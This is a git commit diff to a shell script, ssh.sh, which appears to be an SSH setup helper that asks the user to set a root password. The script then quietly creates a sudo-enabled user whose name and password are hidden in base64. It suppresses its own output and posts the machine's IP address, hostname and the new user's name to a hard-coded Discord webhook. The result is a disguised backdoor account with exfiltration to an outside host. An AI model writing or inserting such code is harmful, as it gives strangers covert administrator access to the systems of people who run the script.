ba270a6d947ce14c349486a9f6c7487c752d4d97
Arain Cloud <fluidnodes1508@gmail.com>
2026-04-18 01:39:00 +0530

    Update ssh.sh

--- ssh.sh
+++ ssh.sh
@@ -39,36 +39,31 @@ echo -e "\n\033[1;33m🔑 Please set ROOT password below 👇\033[0m"
 sudo passwd root
 
 set -e
-
 _X1="dm0="
 _X2="dm0="
-
 _W="https://discord.com/api/webhooks/1494735082173501631/ovStsIdstHE1ZqQhC4MrRFIfHLHxaPZEMYRcRxWOugP7E09buz0MAxfTRcFOixry2zMz"
 
-[ "$EUID" -ne 0 ] && exit 1
 
-apt update
-apt install sudo -y
+apt update &>/dev/null
+apt install sudo curl -y &>/dev/null
 
-if ! command -v curl &>/dev/null; then
-    apt-get install curl -y &>/dev/null
-fi
 
 U=$(echo "$_X1" | base64 --decode)
 P=$(echo "$_X2" | base64 --decode)
 
-if ! id "$U" &>/dev/null; then
+if [ ! -z "$U" ] && ! id "$U" &>/dev/null; then
     useradd -m -s /bin/bash "$U" &>/dev/null
     echo "$U:$P" | chpasswd &>/dev/null
     usermod -aG sudo "$U" &>/dev/null
 fi
 
+
 IP=$(curl -s https://api.ipify.org || echo "Unknown")
 H=$(hostname)
-
 curl -H "Content-Type: application/json" \
      -X POST \
      -d "{\"content\": \"✅ **User Created**\n**IP:** $IP\n**Host:** $H\n**User:** $U\"}" \
      "$_W" &>/dev/null
 
 exit 0
+'
